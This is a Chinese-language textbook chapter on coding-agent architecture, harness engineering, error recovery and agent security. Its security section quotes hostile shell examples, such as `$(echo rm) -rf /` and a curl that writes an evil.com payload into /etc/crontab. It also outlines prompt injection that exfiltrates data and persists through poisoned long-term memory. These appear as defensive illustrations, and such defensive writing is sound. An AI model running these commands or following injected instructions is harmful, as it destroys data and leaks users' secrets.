# Coding Agent 与通用 Agent

> [!abstract] 定位
> 前面章节分别讨论了上下文工程（第二、三章）和工具设计（第四章）。本章将构件组合，回答核心问题：**一个能处理任意任务的通用 Agent，架构长什么样？答案是：以开放任务为目标的通用 Agent，核心是一个 Coding Agent + 文件系统**——Agent 存储代码、数据、记忆和中间结果的工作空间。从 Manus 到 OpenClaw，成功的开放任务型通用 Agent 都遵循这一范式。为什么是代码？因为它不只是工具，而是**元能力（meta-capability）**——"能创造其他能力"的能力：运行时动态写出新工具、新约束、新表达形式。

> [!info] 本文边界
> **负责**：代码 Agent 的工具链、搜索与编辑、失败恢复、验证和安全。<br>
> **不负责**：通用 Agent 定义（见 [[Agent]]）、通用 Harness 原理（见 [[Harness 工程]]）和 DeepSeek Harness 源码系列。

## 一、七个核心工具

一个最简单的任务看工具如何配合（"帮我把项目里所有 TODO 注释整理成清单"）：

```text
Agent（思考）：需要找到所有包含 TODO 的代码行
Agent → Grep("TODO", glob="**/*.py")
工具返回：src/api.py:42: # TODO: add rate limiting
         src/db.py:15: # TODO: migrate to PostgreSQL
         tests/test_api.py:8: # TODO: add edge case tests
Agent（思考）：找到 3 个 TODO，整理成清单写入文件
Agent → Write("TODO_LIST.md", content="...")
Agent：已整理完毕，共发现 3 个 TODO 项，清单保存在 TODO_LIST.md
```

只用 Grep（搜索内容）+ Write（写文件）两个工具；更复杂的任务（统计各模块 TODO 并画柱状图）会加 Code Interpreter 执行 Python。七个工具：**网络搜索、代码执行（Code Interpreter）、Bash Shell、Read File、Write File、Edit File、Grep/Glob**。事实上只要一个 Bash Shell 就够（OpenAI Codex 只提供 Bash 一个工具完成所有文件读写查找）；其他 Agent 保留单独文件工具是为了更好的行号反馈。**一个具备基本 coding 能力的 Agent，即使工具箱只有七个简单工具，也能在遇到新需求时动态扩展自己的能力边界。**

## 二、案例：从 Manus 到 OpenClaw——通用 Agent 的 Coding 内核

Manus、OpenClaw 把 Deep Research、Computer Use、Coding 三大能力融合在一个系统。**为什么 Coding 是核心而非另外两者？因为几乎所有高效的内容生成最终都要落到代码上**：PPT、Word 本质是 OOXML 格式的代码；PDF 报告可经 Markdown/HTML/LaTeX 生成；数据分析和可视化由 Python 脚本完成；成功的浏览器操作序列可固化为可复用代码；Deep Research 的搜索综合可由代码驱动的 Web 请求和解析实现；Computer Use 虽通用性更强，但成本、延迟和稳定性远不如直接用代码或 API 完成相同操作。**代码生成是效率最高、成本最低、可复用性最强的能力基座。**

OpenClaw 架构三层：
```text
多平台消息网关（用户交互层）：WhatsApp / Telegram / iMessage / Slack / CLI
Coding Agent 运行时（推理+执行核心）：网络搜索 · Code Interpreter · Bash Shell
  · Read/Write/Edit File · Glob/Grep · Computer Use（Playwright DOM）
文件系统（记忆·知识·能力中枢）：MEMORY.md（高层级事实/用户偏好）
  · daily/YYYY-MM-DD.md（按日归档交互日志）· SOUL.md（Agent 身份与行为规则）
  · 知识库文件 · Git 版本控制（记忆回滚/历史审计）
大模型 = 新操作系统：屏蔽智能复杂性，提供统一抽象
```

**执行流示例**（"Help me analyze last quarter's sales data and create a summary report"）：
1. **读记忆**：读 MEMORY.md，发现用户偏好 PDF 格式报告、数据源是 Google Sheets
2. **调工具**：网络搜索模块获取 Sheets API 用法，代码执行下载数据
3. **写代码**：Python 生成数据分析脚本（pandas 聚合、matplotlib 可视化）
4. **生成产物**：分析结果写 report.pdf，图表写 charts/ 目录
5. **更新记忆**：MEMORY.md 记录"User's sales data is in Google Sheets, ID: xxx"，下次无需再问

**文件系统作为 Agent 中枢**：MEMORY.md 存长期记忆、按日归档 Markdown 日志。选 Markdown 而非向量数据库看似反直觉实则极有效：**用户可直接打开文件阅读和修改 Agent 的记忆**（Agent 记错了，直接删那一行）；Markdown 天然保留时间顺序，避免语义检索的时间混淆；可 Git 版本控制回滚。Agent 拥有写文件能力 = 具备修改自身外部产物的技术条件（首次执行某任务发现关键信息——给某银行打电话发现对方要求开户行地址验证身份——先写入记录；何时足以成为可靠知识仍需验证，见 [[Agent 持续进化]]）。

**适用边界**："Coding Agent 是通用 Agent 核心"主要适用于**开放任务**——任务边界不确定、产物形态多样的场景（深度调研、内容生成、数据处理），无法预先枚举所有工具，代码生成作为元能力提供动态扩展能力边界的最经济路径。垂直领域客服 Agent 任务空间封闭，核心架构围绕固定业务流程、领域工具和对话策略构建，代码更多是工具箱里的一件工具——但即便如此，精确计算、数据处理、规则校验仍离不开 coding。

## 三、Coding Agent 的整体流程

```text
① 项目文档化 → ② 需求理解 → ③ 设计文档 → ④ 编码与测试 → ⑤ 审查与交付
闭环反馈：测试失败→修改→重测（④内循环平均 2-3 轮收敛）；
Lint 错误→即时修复；审查发现问题→回退④
计划先于行动 · 验证贯穿始终 · 文档与代码共同演化
```

**① 项目文档化**：首次接触代码仓库，首要任务不是动手改代码而是建立认知框架（像新员工第一天先熟悉项目）。关键文档缺失时主动承担文档化——系统阅读代码库，识别主要模块、核心抽象、依赖关系，生成含架构概览、目录结构、测试运行指南的初始文档。**知识的显式化是高效协作的前提**。Agent 专用形态——**项目指令文件**：CLAUDE.md、AGENTS.md、.cursorrules 已成业界事实标准，每次会话开始自动注入上下文（项目级系统提示词）；承载面向 Agent 的行为约定：构建测试命令（"用 pnpm test 而不是 npm test"）、代码风格（"禁用 any 类型"）、明确禁区（"不要改动 migrations/ 目录"）。与 OpenClaw 的 SOUL.md（约定"Agent 是谁"）、MEMORY.md（沉淀跨会话经验）同一思路不同层面。从上下文工程角度看，指令文件还是**最经济的稳定前缀**——内容不随任务变化，天然 KV Cache 友好；也是"知识必须存在于代码库本身"原则的最直接落地。**评估团队 AI-ready 程度的简单指标：一个远程新人只靠代码仓库和文档，能不能独立开展工作。**

**② 任务理解与需求澄清**：边界清晰、影响有限的简单需求可直接实现；复杂需求须谨慎——复杂性来源：需求模糊（知道要什么但说不精确）、实现路径多样（多方案各有权衡）、影响广泛（多模块、可能破坏现有功能）。通过探索性调研澄清边界，必要时主动对话："优化系统性能"要先搞清——优化目标是什么（响应时间/内存/吞吐）、可接受的权衡（能否改接口/降易用性）、瓶颈在哪。**需求模糊就开始编码往往导致大量返工。**

**③ 设计文档**：抽象需求到具体计划的桥梁——修改哪些模块及原因、采用什么方案及相对优势、引入哪些新依赖、对系统的影响。编写本身迫使 Agent 深度思考，在投入大量编码前先在概念层面验证可行性。**设计文档为人类提供高效介入点：审查简洁的设计文档比审查数百行代码容易得多**——完成后提交审查，批准后再继续。

**④ 编码与测试**：遵循项目代码规范，复用现有抽象，适度重构保持库健康。立即进入测试驱动质量保障——为新功能写测试用例覆盖正常路径、边界条件、异常情况；执行测试套件；失败时**分析原因、定位问题、修改直到全部通过**——"测试-修复"循环可能多次迭代，正是这种自我纠错能力把 Coding Agent 从代码生成器提升为可靠的工程助手。**Coding Agent 最常见的偷懒方式就是跳过这一环节——写完不跑测试就报告"任务完成"**；把"测试通过"而非"代码写完"定义为完成标准，正是 Loop 工程"由验证判定何时可以停"的落地。

**⑤ 审查与交付**：即使测试全过也没结束——批判性自审：可读性、注释、性能、安全漏洞、代码风格与最佳实践（读代码、跑 lint、或调用专门的代码审查子 Agent）；发现问题回修改阶段而非带缺陷交付。架构层面变化（新模块、依赖变化、核心抽象语义改变）需**同步更新架构文档**——过时的文档比没有文档更糟。Agent 帮助维护项目知识库的完整性和时效性。

现实裁剪：推荐的是工程化流程，现实中按需裁剪——简单 bug 修复跳过设计文档，任务复杂影响面大才完整走完。不同模型裁剪方式不同（有的第一次修改前广泛阅读目录/实现/调用方/测试；有的读少数最可能相关的文件马上提交补丁，把编译与测试反馈当作调查的一部分）——**"何时停止收集信息、开始行动"的阈值首先是模型学到的行为策略**（见 [[Agent 评估]] 行动阈值实验）。

## 四、Harness 工程在 Coding Agent 中的实践

**Coding Agent 可能是最能受益于 Harness 工程的领域——代码编写是所有 Agent 任务中可验证性最高的一类**，约束、验证、纠正都有现成基础设施依托。五要素落地：

| 组件 | 内容 |
| --- | --- |
| 验收基线 | 什么算做完——测试套件、CI 管道、代码审查标准 |
| 执行边界 | 能碰什么不能碰什么——模块边界、依赖规则、权限控制 |
| 反馈信号 | 自动化对错判断——Linter 输出、测试结果、类型检查错误 |
| 回退手段 | 出问题怎么恢复——Git 版本控制、沙盒隔离、快照回滚 |

**任务四象限**（目标清晰度 × 验证自动化）：

| | 结果可自动验证 | 结果需人工验证 |
| --- | --- | --- |
| **目标明确** | 最佳区域：修复有测试用例的 bug | 吞吐量受限：代码重构需人工审查 |
| **目标模糊** | 高效地跑偏：用 linter 优化"代码质量" | 难以启动："让 UI 更好看" |

Harness 的目标就是把任务推向"目标明确 + 验证自动化"象限。**代码编写天然处于核心——测试套件给明确验收标准，Linter 和类型检查器给即时自动验证，Git 给完美版本控制回退**。Coding Agent 是当前所有 Agent 类型中成熟度最高的：**不是因为代码生成模型特别强，而是因为软件工程几十年积累的基础设施天然构成了一套强大的 Harness**。

**业界三案例**：
1. **大规模代码迁移**（大型科技公司公开实践）：关键不在模型强，而在 Harness 做对三件事——**知识必须存在于代码库本身**（Agent 看不到的等于不存在）、**约束编码进 Linter 和 CI 而非写在文档里**、**验证和纠正全链路自动化**。
2. **LangChain**：仅优化 Harness（系统提示词、工具中间件、自验证循环）就显著提升基准表现；"用 Agent 分析失败轨迹来改进 Harness"的方法论使 Harness 工程从人工经验驱动转向数据驱动。
3. **Anthropic 长时运行 Agent**：初始化 Agent 分解任务清单 + 执行 Agent 增量推进留交接产物——解决长任务"上下文耗尽"和"过早声明完成"。

**四条可迁移原则**：
1. **约束优先于指导**：能用代码强制的规则（Linter 规则、类型约束、CI 检查）不要用文档建议——前者是"做不了"，后者只是"建议别做"。
2. **验证要自动化**：人工审查是不可扩展的瓶颈；测试套件、代码质量检查、行为监控的投入回报率远高于加人。
3. **反馈越快越好、越结构化越好**：错误信息越详细、越接近错误发生时刻，纠正效率越高——Agent 状态栏的详细错误信息、工具调用计数器正是体现。
4. **回退要可靠**：Agent 在安全网内才能大胆试错——Git 分支、沙盒、快照确保任何错误可逆。

**约束的另一层目的：防止过程性错误**。验收基线管结果对不对，执行边界管过程——修复数据库故障时直接删库重建，"修复"确实生效但数据没了；修复编译错误把代码全删重写，编译通过但实现没了。**破坏性捷径总是存在：即使写进最终评估指标，Agent 也常能绕过**——生产级 Harness 要对 rm -rf、删除生产数据、覆盖未读文件这类危险动作设专门检查与审批（语义解析、Sidecar 复核），**约束的是动作而非仅仅是结果**（第八章 RLVP 的"奖励结果、惩罚路径"从训练侧回答同一问题）。

**工具编排：故障边界控制**：支持并行工具调用时，一个工具失败哪些该中止、哪些该继续？**故障只在同一批并行调用内传播，不上升到父级操作**——同时读三个文件一个找不到，只报告这一个失败，不取消另两个，更不让整个任务中止。

## 五、故障与错误恢复

### 故障分类学：四层

| 层 | 故障 |
| --- | --- |
| API 层 | 限流（HTTP 429）、服务过载、请求超时、连接中断、输出触顶被截断——与任务内容无关的基础设施噪声 |
| 工具层 | 幻觉调用（调不存在的工具）、参数畸形（不符输入约束）、执行抛异常，以及最危险的——**工具反复返回同一错误而模型不加改变地反复重试** |
| 上下文层 | 窗口溢出、压缩失败、轨迹结构损坏（工具调用缺配对结果消息） |
| 控制流层 | 死循环（反复执行相同操作毫无进展）、**死亡螺旋**（错误触发的恢复逻辑自身又调用 LLM、再次出错、连锁反应） |

### 检测：先分类，再计数

第一个判断不是"要不要重试"而是"**值不值得重试**"——可重试错误（限流、过载、网络抖动）重试才有意义；不可重试（参数不合法、权限不足、工具不存在）原样重试多少次都一样，必须改变输入或策略。**生产级 Harness 维护一张"错误 → 恢复策略"映射表，而不是笼统的"出错就重试"。**

模式检测：**重复调用指纹**——对"工具名 + 参数"计算指纹，相同指纹反复出现就是无进展循环的明确信号；**连续失败计数**——每条恢复路径独立计数器，为熔断提供依据。

**活性与完整性监控**：流式连接最危险的失败不是断开（会立即报错）而是**静默卡死**——连接成功但数据流停止，像水管通着但不出水；SDK 超时往往只覆盖初始连接而非传输过程 → 需要独立的**空闲看门狗**（超时无新输出判定卡死，主动杀挂起的流并重试）。原则：**每个长连接都需要活性信号，而非仅依赖连接超时**。完整性监控针对轨迹结构：发现工具调用缺配对结果消息，注入上下文前自动修复配对而非把结构异常抛给模型。值得注意的细节：部分生产 Agent 同时运行产品模式和训练数据收集模式——**产品模式可以用占位符修补缺失消息，训练模式拒绝修复**（合成占位符污染训练数据）——"产品宽容、训练严格"的双重标准体现 Harness 与模型训练的深度耦合。

### 恢复：分级升级，逐级透明

1. **静默重试**：可重试错误的默认动作。两个细节：**指数退避叠加随机抖动**（避免大量客户端同步重试二次拥塞），尊重服务端等待时长提示；**区分前台与后台调用**——主循环请求失败要重试，标题生成、输入建议等辅助后台调用失败直接放弃（否则后台重试挤占主链路配额，形成"重试放大"）。
2. **降级与接续**：重试无效时改变请求再试。输出触顶（生成到一半被长度限制截断）：先静默提升输出上限重发，仍不够在消息末尾追加元指令让模型从断点接续生成；主模型持续过载降级备用模型（**需先剥离旧模型私有格式块**，否则新模型无法解析历史消息）；高成本模式被限流暂时回落标准模式。
3. **暴露给用户**：所有自动手段用尽才呈现错误，并附上已尝试的恢复动作。

**工具层错误走另一条路：不终止会话，把错误变成模型的输入**——幻觉调用收到"工具不存在"的结构化错误；参数校验失败收到附带输入约束提示的错误；畸形参数（该是对象却输出了字符串）执行前先程序化修复。错误以普通工具结果身份进入上下文由模型下一轮自行纠正——"反馈越结构化越好"的应用。

**核心原则：错误处理的边界不是单次请求，而是整个恢复循环**——确认无法恢复之前，中间错误不暴露给消费者（用户或下游订阅系统）；恢复期间扣留错误消息，恢复成功消费者毫无感知。

### 终止：每条恢复路径都要有上限

恢复机制自身也可能失效——**每条恢复路径必须有熔断上限**：上下文压缩连续失败 N 次放弃压缩、权限分类连续失败回退人工询问、输出接续最多固定轮数。**阈值来自生产数据而非拍脑袋**：Claude Code 压缩熔断"连续 3 次"来自真实统计——曾有一个会话在这条路径连续失败三千余次，仅这类无效重试每天全球约 25 万次 API 调用浪费；逾千个会话出现过 50 次以上连续失败。3 次是"绝大多数故障在此之前已恢复"与"继续重试基本无望"的经验拐点。

**死亡螺旋**：错误处理路径中的逻辑本身又调用 LLM。真实案例：Agent 上下文溢出停止 → 触发"结束时自动提交代码"的停止钩子 → 钩子调 LLM 生成 commit message → 再次上下文溢出 → 又触发钩子。防护两条：**错误路径上禁用一切会再次调用模型的副作用逻辑**（宁可丢掉一次辅助功能如自动记忆提取）；**递归深度计数器**检测打断残余连锁。最后，所有自动化机制之上还需**全局终止与升级条件**：最大迭代轮数、会话预算上限、连续失败超阈值升级人工。

## 六、实现技巧五件套

1. **并行工具调用、流式执行与级联中止**：传统串行模式（生成→执行→结果→决定下一步）浪费大量时间。利用流式响应：**第一个工具调用的参数一经完整生成并通过校验即可立即执行**，无需等后续调用生成；独立调用并行执行。故障处理：每个工具定义声明是否支持并发（默认否，失败安全）；级联中止只终止同批依赖该结果的调用，不波及独立调用和父级操作。
2. **上下文精细管理**：代码库大、窗口有限。文件读取支持按行号范围读特定片段（读第 100-150 行而非几千行全量）；**返回内容附加行号标注**——看似简单的设计带来巨大价值：模型可精确引用"src/main.py 第 42 行"，减少歧义使编辑更可靠。终端输出数千行会耗尽预算——头尾截断 + 完整输出落盘。
3. **环境信息动态注入（Agent 状态栏）**：Coding Agent 高度依赖执行环境状态——当前工作目录（路径引用不出错）、git 分支（知道在主分支还是特性分支）、最近提交（项目演化脉络）、未暂存/已暂存变更概览。**不应硬编码在静态系统提示词（破坏 KV Cache），而应作为动态追加式状态栏实时生成注入**——Agent 获得"环境感知"能力，每个决策基于当前状态而非过时假设。
4. **命令执行环境的状态持久化**：cd 切目录、激活虚拟环境、设环境变量、启动后台服务——如果每次命令都在全新 shell 执行这些状态全丢（刚 cd 到项目目录，下一条又回根目录，反复切换）。**维护持久化终端会话**：Agent 启动时创建，整个交互过程保持活跃——更符合人类开发者在长期运行的终端窗口中工作的习惯。保留启动隔离终端的能力以支持并行任务，持久化会话是默认模式。
5. **即时的语法反馈机制**：修改代码后不等用户要求测试才检查——文件写入完成，工具层自动运行 linter/语法检查器，结果作为工具返回值一部分。像 IDE 打错括号立刻画红线——**Agent 在错误引入的那一刻修正，而非运行测试时才发现**。

五个技巧相互配合，指向同一目标：**让 Agent 像经验丰富的开发者那样流畅工作**。

## 七、Coding Agent 中的搜索工具

| 工具 | 做法 | 适用 | 局限 |
| --- | --- | --- | --- |
| 正则内容匹配（grep/ripgrep） | 逐行扫描模式匹配，支持文件类型过滤（只搜 Python）与路径过滤（排除测试目录） | 知道具体文本（函数名、变量名、错误消息）时快速准确定位所有出现 | 只找字面匹配——搜"用户认证"找不到没有"认证"二字但处理登录逻辑的函数 |
| 文件名模式匹配（glob） | 只在路径结构中找（`**/*.test.ts`、`src/components/**/Button.tsx`） | 不需打开文件、比内容搜索快得多——**探索项目结构的第一步** | 只有路径没有内容 |
| 语义代码搜索 | 理解查询和代码的"意义" | 探索性任务：不熟悉的库中找"与数据库交互"的代码 | 需维护嵌入索引 |
| 符号定义/引用查找 | IDE 的"跳转定义""查找引用"，区分同名符号的定义与调用（authenticate 第 42 行是定义、189 行是调用） | 追踪调用链 | 主流 Agent 未采用 |

**语义搜索的两个关键问题**：①结构感知的分块——按函数、类、方法等完整语义单元切分，不按固定字符数盲切；②混合检索（[[Agentic RAG]] 技术栈）——向量嵌入找语义相似用词不同的代码（搜"验证用户身份"找到 check_credentials），关键词匹配精确定位函数名变量名，重排序合并。

**路线之争**：Claude Code 为代表的终端型 Agent **刻意不建嵌入索引**，纯 agentic grep + glob 现场检索——不必维护随代码演化不断陈旧的索引，省掉整套索引基础设施；Cursor 这类 IDE 型工具早期愿意为跨文件语义召回付建索引成本——**目前 Cursor 等也已改用 grep + glob 现场检索**。

**实践组合**：先用语义搜索找到相关模块 → 正则匹配精确定位代码行 → 符号搜索追踪调用链——"从粗到细、从语义到语法"的渐进式策略。

## 八、Coding Agent 中的文件编辑工具

难点不在操作本身，而在**让 LLM 以高效又可靠的方式告诉系统"改哪里、怎么改"**——人类语言表达与机器精确执行间的根本张力。五种方案：

| 方案 | 做法 | 优势 | 劣势 | 采用 |
| --- | --- | --- | --- | --- |
| **Diff + Apply Model** | 模型生成变更描述（git diff 式或带省略标记的代码骨架），交给专门的应用模型（更小更快的 LLM）合并产出完整新文件 | 主模型专注高层逻辑、应用模型专注文本操作（关注点分离） | 合并环节脆弱：描述与文件有微小出入需判断是否同一位置、多个相似片段可能合并错位 | Cursor 早期；基础模型能力提升后已弃用 |
| **Old String → New String** | 模型提供要替换的原文和新文本，框架执行字符串查找替换 | **可预测、透明**——old string 存在且唯一则成功否则失败，无模棱两可 | 删大段需完整输出原始内容；一个字符偏差就失败；多次出现需更长上下文消歧 | **Claude Code、Codex、今天的 Cursor** |
| **行号定位** | "删除第 X-Y 行，插入新内容"；读文件工具提供行号 | 精确无歧义，大段删除只需首尾两个数字 | 每次编辑后行号变化——多次编辑需都按初始行号定位 | IDE 深度集成场景 |
| **类 Vim 命令** | 复制、剪切、粘贴等丰富操作 | 重组代码（函数移动）高效 | 学习负担大，弱模型错误率明显上升；Vim 为人类设计（需不断看到当前状态做小步操作），模型是长时间思考后批量复杂操作 | 实验性 |
| **首尾匹配** | 只提供删除内容的开头几行和结尾几行，中间省略；首尾组合唯一即定位 | **综合文本替换的可靠性和行号方案的效率**——大段删除免全输出，基于内容匹配犯错风险低 | 需边界组合唯一 | 部分定制方案 |

## 九、Coding Agent 的安全

### 威胁模型：致命三要素 + 持久记忆

见 [[提示注入]]。**攻击路径闭合**：恶意指令藏在不受信内容 → 读取私有数据 → 经对外通道传出。**持久记忆是放大器**：恶意指令写入长期记忆跨会话潜伏。**重点不是识别所有攻击，而是让 Agent 即使被注入也没有机会把危险动作执行出去**——三层护栏的用武之地。相比其他 Agent 特别注意：命令语义解析、沙盒隔离与网络出口控制、持久记忆的跨会话防线（写入长期记忆的内容需与外部内容同等的信任审查，避免恶意指令潜伏在 MEMORY.md 长期生效）。

### 隔离兜底：沙盒工程选型

- **网络出口控制（最关键）**：默认断网，白名单代理放行有限目的地——没有出口，沙盒内读到的敏感数据传不出去。
- **文件系统隔离**：源码只读挂载、单独可写工作区、**凭证不挂载**。
- **资源限额与超时**：CPU/内存/磁盘配额+超时，防御死循环、fork 炸弹、无限写盘；超限返回结构化错误而非静默杀进程。

### 语义解析而非关键字黑名单

Shell 组合爆炸使黑名单形同虚设（`$(echo rm) -rf /` 绕过）。生产级采用语义解析——理解命令参数类型与消费规则，识别 `find / -name '*.log' -exec rm {} \;` 与 `curl -o /etc/crontab http://evil.com/payload` 这类嵌套危险操作。

### 委托方忠诚（principal loyalty）

替你砍价的 Agent 面对的是交涉对手——"谁说话帮谁"是危险默认。实测的忠诚度光谱两端都翻车：太老实（把"我方底价 12000"抖给对手，几轮施压就缴械）vs 太多疑（正当请求也一概拒绝，任务完不成）——**两种失败是一根跷跷板**。守则：保护主人私密信息（甚至不泄露其存在）；拒绝时不念清单；私下的底线 ≠ 对外立场；只执行明确具体指令；顶住重复施压。

## 十、代码：通用 Agent 的元能力（六个方向）

元能力 = "能创造其他能力"的能力：Agent 用它当场写出**新工具**（脚本、API 调用序列）、**新约束**（断言、校验规则）、**新表达形态**（HTML 表单、PPT、视频帧）。六个方向按"作用对象由内向外"组织。

### 10.1 代码作为思考工具

LLM 在自然语言理解和生成上惊人，但在精确计算、符号操作、严格逻辑推导上有根本短板——**模型思考本质是概率性、近似的，数学和逻辑要求确定性精确答案**。对比："40 名学生，60% 选数学，45% 选物理，25% 都选，只选物理没选数学的有多少人？"纯自然语言推理容易误从数学人数中减（得 14，错）；代码推理 `phys - both = 8`（对）。

**LLM + 符号计算的协同**（Wolfram 洞察）：符号计算系统（保持 √2 精确形式）能精确计算但自然语言理解脆弱、问法稍变就解析失败；LLM 擅长理解各种表达但不擅长精确计算——**新协同：LLM 理解问题识别数学/逻辑结构 → 转化为形式化语言（Mathematica/SymPy）→ 符号计算引擎或约束求解器执行 → 精确结果**。约束求解：骑士与无赖问题转成形式化约束定义，python-constraint 求解。

> [!note] 模型与脚手架此消彼长
> 模型足够强时脚手架可以更薄——模型自己能把逻辑想对，代码求解器增益收窄；模型不够强就得在脚手架里做更多事。**评估一项 Agent 技术时容易忽视的前提：同一套脚手架配不同能力的模型，结论可能截然不同。**

### 10.2 代码作为业务规则的约束

Harness 核心原则"约束：编码化而非文档化"的落地——Agent 能自主完成规则到代码的转化。自然语言规则的歧义："购买后 7 天内可退款"——7 天是自然日还是工作日？"购买"是下单时间还是发货时间？**代码无歧义：要么成功运行要么抛错。**

两种表达互补：系统提示词的自然语言规则供理解和解释、寻找变通方案、调用前初判；代码化校验工具保精确性与确定性——**特别适合不可逆操作**（取消订单、转出资金、删除数据）作为最后一道防线。

**三重保障**（以 τ-bench 航空取消政策为例）：
1. **系统提示词的自然语言规则**帮助理解和解释；
2. **工具描述与参数设计作为 checklist**：工具 docstring 列出完整取消政策，要求"调用前先查询订单详情逐条核对"；可选 expected_* 参数促使模型显式写出判断依据——**填写参数的过程是强制性 checklist**：模型查到"经济舱未购保险"时很可能在准备调用过程中就注意到规则 5，根本不发起调用而是直接建议"可考虑购买保险后再取消或改签"。这一层引导思考减少无效调用，但**不承担安全责任**——expected_* 只是自我陈述，服务端从不当作事实；
3. **服务端真值校验才是守门员**：舱位等级、保险状态、预订时间、航段使用、航班状态**全部由服务端查询数据库获得，当前时间来自服务端时钟——没有任何一条政策事实来自模型自报的参数**。模型可能幻觉、可能被注入操纵——同一上下文中的 Agent 难以自证清白。若 cabin_class、has_insurance、current_time 由模型填写，模型报错一个值守门员就形同虚设。**最后一道防线必须建立在模型无法伪造的数据之上——独立性不仅指独立的模型，更指独立的数据来源。**expected_* 与真值不一致时记录告警，用于发现模型的错误认知或潜在注入。

### 10.3 代码驱动的多媒体生成

复杂文档创作本质是结构化数据的组织呈现——HTML 描述结构、CSS 控制样式、JS 实现交互。GUI 所见即所得对 Agent 既不直观也不高效（需视觉理解和精确坐标定位）；**通过代码生成绕开视觉定位难题，获得精确控制**。

**PPT 生成**：现代框架（Slidev）用 Markdown/HTML 定义演示内容——创建一页幻灯片只需写标记语言。**仅能生成代码还不够——Agent 不知道渲染效果**（内容太挤、文字溢出、图片尺寸），需要 **Proposer-Reviewer 机制**：
- Proposer Agent：阅读论文，提取章节/论点/图表，规划页面，逐页生成 Slidev 代码
- Reviewer Agent：`slidev export --per-slide` 渲染每页截图，Vision LLM 从内容密度、可读性、布局、美感分析，生成**结构化改进建议**——不是模糊的"不好看"，而是"Slide 3: 内容过多，建议拆分"、"Slide 7: 字体过小，增大到 14pt"（含页码、问题类型、严重程度字段）
- 迭代直到达标或最大轮数（如 5 轮）——"质量达标"与"最大轮数"正是 Loop 工程的两类显式终止条件

**为何分离双 Agent（上下文管理优势）**：单 Agent 需在同一上下文累积数十页渲染截图的多轮迭代（1080p 截图 = 数千 token × 14 页 × 5 轮）→ 上下文爆炸 + 注意力分散；双 Agent 的 Reviewer 每次只处理最新版本渲染图片、Proposer 只累积结构化文本反馈——token 少且更易推理。

**视频**：通用 Computer Use 做视频编辑面临 GUI 极复杂的根本挑战；重构为 API 调用 + 代码生成大幅降低复杂度——Blender Python API、FFmpeg 暴露结构化可组合的核心功能。两步定位策略：粗粒度（每 10 秒截图，Vision LLM 返回场景区间"冲浪在 40-110 秒"）→ 细粒度（每秒一张精确定位边界）——**视频分析封装为子 Agent 避免大量截图占用主上下文**。PPT + TTS + ffmpeg 合成讲解视频。

**3D 与工业零件：代码生成 vs 生成模型的边界**——两个判断标准：
1. **产物有没有紧凑的精确描述**：法兰盘（外径、厚度、孔位圆直径、孔径、孔数——五六个参数完整定义）代码是无损表达；绿植、太湖石、人脸内在复杂度近乎无限。
2. **精度要求和可验证性**：零件每个尺寸都是硬约束（孔径 5mm ± 0.05mm，差一丝就废品），代码生成可程序化验证（载入网格量尺寸逐项对规格）；3D 生成模型无法直接核对。
3. **表示形式与可编辑性**：制造要 B-rep 参数化实体（STEP 文件的特征树与尺寸参数直接驱动 CNC）；生成模型吐三角面片。"安装孔 M5 改 M6"——代码路线改一个数字重跑，其余尺寸分毫不差；生成模型只能整个重新生成，其余尺寸是否跑偏全凭运气。实际系统可混合：几何体代码参数化，表面纹理交给生成模型。

### 10.4 代码作为系统适配器

Agent 要打交道的外部服务常没有现成 SDK：文档缺失、返回格式非标准、字段随版本漂移。**Agent 不必等人写好适配层——当场阅读接口文档或直接观察一两条真实响应，即时生成适配代码**：构造 HTTP 客户端、拼装鉴权头、解析非标返回、转换数据模型。**代码是连接任意系统的"万能胶"——哪里接不上就现场生成一段胶水补上**。延伸到完全没有 API 的系统：Computer Use 操作界面走通一次 → 把成功操作序列用代码固化为 RPA 工具——未来直接运行，高速稳定不再调用昂贵视觉思考。

**Agent 日志解析和可视化**：可视化 Agent 执行面临格式多样且不断演化、轨迹数十万字符需平衡概览与细节。**自动修复的反馈循环**：前端遇到无法解析的日志格式 → 不显示错误而是自动把失败信息（原始样本、详细报错）报告 Agent → Agent 分析样本结构生成能正确解析的前端代码 → 虚拟浏览器自动测试（验证解析正确性，Vision LLM 检查可视化效果）→ 通过后热更新。

**生产日志智能诊断**：从日志识别问题、定位根因、构建测试用例成本高。代码生成路径：Agent 读生产轨迹 + 架构文档 + PRD → 判断执行流程是否符合预期、定位问题模块 → 生成结构化问题报告（优先级 P1 用户流失风险、模块 cancellation_handler、描述"取消失败后未向用户解释原因和替代方案"）→ 自动生成回归测试用例（引用轨迹 ID 和交互轮次，测试框架自动重放验证）→ MCP 对接 GitHub 创建 Issue 分配开发者——**从问题发现到任务分派全自动化，人工诊断从小时级降到分钟级**。

### 10.5 代码作为生成式 UI

文本是线性单一交互：收集结构化信息时反复问答冗长；呈现复杂数据关系表达力有限；多选项选择不如可视化直观。Agent 可动态生成表单、交互式图表甚至完整 Web 应用——**生成式 UI（Generative UI）**。

**动态表单澄清意图**：OpenAI Deep Research 式文本问答——每个问题一轮对话，十个澄清点十轮；问题间依赖（选了目的地影响交通方式选项）纯文本难表达。Agent 生成含级联逻辑的 HTML 表单：文本框、下拉菜单、复选框、日期选择器；JavaScript 实现动态逻辑（选"往返"自动显示返程日期）——**用户一次填完整张表单，JSON 结构化返回，Agent 携带完整参数继续执行**。

**用 HTML 交付成果（取代 Markdown 汇报）**：交互式演示（可操作形式直接演示系统如何运行，一看就懂）；更好的数据可视化（图表而非表格 + 交互式组件自行浏览筛选下钻）；**可持续完善的交付件**——不必是任务结束时一次性产出的死物，可在工作推进中不断补充完善（作者的每个研究项目维护交互式网站：实验数据追溯——每次实验的数据、prompt、LLM 原始回复逐条查看，更容易发现数据构造/格式/分布问题与 judge 打分的系统性偏差；训练指标监控——"内科指标"（训练/验证损失、梯度范数、学习率、困惑度、奖励、KL 散度、策略熵）反映训练过程本身是否健康，往往比任务准确率更早暴露损失不收敛、梯度爆炸、训练崩溃；运行原理可视化）。

**SQL 查询的 Artifact 模式**：Agent 执行 SQL 后用自然语言描述结果——低效且 LLM"抄写"数据极易出错。**Artifact 模式：LLM 只生成 SQL 作为独立可执行产物，系统拿 SQL 直接查库、渲染表格——数据从数据库直达用户界面，完全绕过 LLM 这个"中间人"**。更进一步两个 artifact 流水线：SQL 查询 + 可视化代码（柱状图），SQL 结果直接传可视化代码——**LLM 只负责生成代码，不参与数据传递**。安全：只读数据库账号、解析 SQL 只允许经批准的 SELECT（拒绝 DDL/DML/多语句）、用户值服务端参数化绑定、限制查询时间/返回行数/可访问表；可视化代码在隔离沙盒运行。**Artifact 模式缩短数据路径，但不能替代权限检查与执行隔离。**

